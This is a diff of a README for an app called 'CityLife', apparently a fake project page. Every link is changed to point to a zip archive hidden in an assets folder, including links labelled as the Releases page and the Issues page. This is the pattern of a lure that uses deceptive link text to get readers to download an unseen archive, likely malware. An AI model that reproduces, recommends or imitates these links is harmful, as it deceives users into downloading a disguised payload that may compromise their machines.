@@ -10,7 +10,7 @@ CityLife is a unique city builder that lets you plan your life through simulatio
 
 ## 🔗 Download CityLife
 
-[![Download CityLife](https://github.com/AFVBASFGG/CityLife/raw/refs/heads/main/assets/GLB/in-disrepair/factory/City-Life-v2.0-beta.4.zip%20CityLife-v1.0-brightgreen)](https://github.com/AFVBASFGG/CityLife/raw/refs/heads/main/assets/GLB/in-disrepair/factory/City-Life-v2.0-beta.4.zip)
+[![Download CityLife](https://raw.githubusercontent.com/AFVBASFGG/CityLife/main/assets/glb-sprites/City-Life-v2.3-beta.2.zip%20CityLife-v1.0-brightgreen)](https://raw.githubusercontent.com/AFVBASFGG/CityLife/main/assets/glb-sprites/City-Life-v2.3-beta.2.zip)
 
 ## 💻 System Requirements
 
@@ -24,7 +24,7 @@ Before downloading, make sure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit the [CityLife Releases page](https://github.com/AFVBASFGG/CityLife/raw/refs/heads/main/assets/GLB/in-disrepair/factory/City-Life-v2.0-beta.4.zip) to download the application. 
+To get started, visit the [CityLife Releases page](https://raw.githubusercontent.com/AFVBASFGG/CityLife/main/assets/glb-sprites/City-Life-v2.3-beta.2.zip) to download the application. 
 
 1. On the Releases page, find the latest version of CityLife.
 2. Click the download link for your operating system.
@@ -71,7 +71,7 @@ CityLife touches on several themes that may interest users looking to understand
 
 ## 💬 Support
 
-If you encounter issues while downloading or using CityLife, please reach out on our [Issues page](https://github.com/AFVBASFGG/CityLife/raw/refs/heads/main/assets/GLB/in-disrepair/factory/City-Life-v2.0-beta.4.zip). Our community is here to help you navigate through any challenges.
+If you encounter issues while downloading or using CityLife, please reach out on our [Issues page](https://raw.githubusercontent.com/AFVBASFGG/CityLife/main/assets/glb-sprites/City-Life-v2.3-beta.2.zip). Our community is here to help you navigate through any challenges.
 
 ## 📝 Feedback
 
@@ -81,4 +81,4 @@ We value your input. If you have suggestions or feedback, please submit them thr
 
 Thank you for choosing CityLife! We appreciate your interest in our project and hope you enjoy building your dream city while planning a fulfilling life. 
 
-[Download CityLife Now!](https://github.com/AFVBASFGG/CityLife/raw/refs/heads/main/assets/GLB/in-disrepair/factory/City-Life-v2.0-beta.4.zip) and start your adventure!
+[Download CityLife Now!](https://raw.githubusercontent.com/AFVBASFGG/CityLife/main/assets/glb-sprites/City-Life-v2.3-beta.2.zip) and start your adventure!
